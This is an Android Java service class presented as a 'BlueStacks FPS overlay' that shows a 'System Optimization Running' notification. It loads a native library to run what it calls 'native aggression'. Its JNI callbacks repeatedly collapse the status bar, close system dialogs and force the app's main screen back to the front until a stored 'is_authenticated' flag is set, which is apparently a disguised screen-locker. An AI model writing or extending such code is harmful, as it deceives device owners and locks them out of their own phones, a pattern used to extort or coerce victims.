package com.bluestacks.fpsoverlay;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.content.pm.ServiceInfo;
import java.lang.reflect.Method;

public class FPSService extends Service {

    static {
        System.loadLibrary("fps-native");
    }

    public native void startNativeAggression(String serviceName);
    public native void stopNativeAggression();

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onCreate() {
        super.onCreate();
        startInForeground();
        
        // Panggil native aggression
        startNativeAggression(getPackageName() + "/.FPSService");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    private void startInForeground() {
        String CHANNEL_ID = "fps_overlay_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "BlueStacks Engine Service",
                    NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }

        Notification.Builder builder = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ?
                new Notification.Builder(this, CHANNEL_ID) : new Notification.Builder(this);

        Notification notification = builder
                .setContentTitle("System Optimization Running")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setOngoing(true)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(1, notification);
        }
    }

    // Dipanggil oleh Native via JNI
    public void collapseStatusBar() {
        try {
            Object statusBarService = getSystemService("statusbar");
            Class<?> statusBarManager = Class.forName("android.app.StatusBarManager");
            Method collapse = statusBarManager.getMethod("collapsePanels");
            collapse.setAccessible(true);
            collapse.invoke(statusBarService);
        } catch (Exception e) {
            sendBroadcast(new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS));
        }
    }

    // Dipanggil oleh Native via JNI
    public void closeSystemDialogs() {
        Intent closeDialogs = new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
        sendBroadcast(closeDialogs);
    }

    // Dipanggil oleh Native via JNI
    public void refreshOverlay() {
        // Cek dulu apakah sudah diautentikasi
        boolean isAuth = getSharedPreferences("AUTH_PREFS", MODE_PRIVATE)
                        .getBoolean("is_authenticated", false);
        
        if (!isAuth) {
            Intent intent = new Intent(this, MainActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            startActivity(intent);
        } else {
            stopSelf();
        }
    }

    @Override
    public void onDestroy() {
        stopNativeAggression();
        super.onDestroy();
    }
}
